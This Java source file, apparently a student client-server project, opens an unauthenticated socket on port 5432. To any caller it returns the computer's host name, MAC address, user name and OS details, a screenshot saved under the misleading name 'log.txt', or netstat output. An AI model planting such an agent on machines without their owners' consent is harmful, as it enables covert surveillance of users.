package clienteproject;

import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.image.BufferedImage;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.Properties;

import javax.imageio.ImageIO;

import Comon.Computador;

public class cliente1 {

	public static void main(String[] args) {
		
		try {
			ServerSocket servsock = new ServerSocket(5432);  
			Robot robot = new Robot();
			String linha;
			while (true) {
				Socket sock = servsock.accept();
				InputStream in = sock.getInputStream();
				BufferedReader buffer = new BufferedReader(new InputStreamReader(in));
				linha = buffer.readLine();
				if (linha.equals("1")) {
					
					try {
						Computador pc;
						Properties p = System.getProperties();
						InetAddress hostlocal = InetAddress.getLocalHost();
						NetworkInterface netInter = NetworkInterface.getByInetAddress(hostlocal);
						pc = new Computador(hostlocal.getHostName(), netInter.getHardwareAddress(), hostlocal.getHostName(),  p.getProperty("user.home"), p.getProperty("os.name"), p.getProperty("os.version"), p.getProperty("user.name"));
						PrintWriter info=new PrintWriter(sock.getOutputStream(), true);
						info.println(pc.toString());
						sock.close();				
					}catch (Exception ioe ) {System.out.println(ioe.getMessage());}
				
				}else if (linha.equals("2")){
					
					try {
						File myFile = new File ("log.txt");
						BufferedImage bi = robot.createScreenCapture(new Rectangle(0, 0, 1400, 800)); 
						ImageIO.write(bi, "png", myFile);
						byte [] mybytearray  = new byte [(int)myFile.length()];
						FileInputStream fis = new FileInputStream(myFile);
						BufferedInputStream bis = new BufferedInputStream(fis);
						bis.read(mybytearray,0,mybytearray.length);
						OutputStream os = sock.getOutputStream();
						System.out.println("Enviando...");
						os.write(mybytearray,0,mybytearray.length);
						os.flush();
						bis.close();
						sock.close();
					}catch (Exception ioe) {System.out.println(ioe.getMessage());}
					
				}else if (linha.equals("3")) {
					
					try	{
						Runtime.getRuntime().exec("cmd /c netstat > netstat.poo");
						File myFile = new File ("netstat.poo");
						byte [] mybytearray  = new byte [(int)myFile.length()];
						FileInputStream fis = new FileInputStream(myFile);
						BufferedInputStream bis = new BufferedInputStream(fis);
						bis.read(mybytearray,0,mybytearray.length);
						OutputStream os = sock.getOutputStream();
						System.out.println("Enviando...");
						os.write(mybytearray,0,mybytearray.length);
						os.flush();
						bis.close();
						sock.close();
				    }catch (Exception ioe) {System.out.println(ioe.getMessage());}
				}
			}
			
		
		}catch (Exception ioe) {System.out.println(ioe.getMessage());}
	}
}
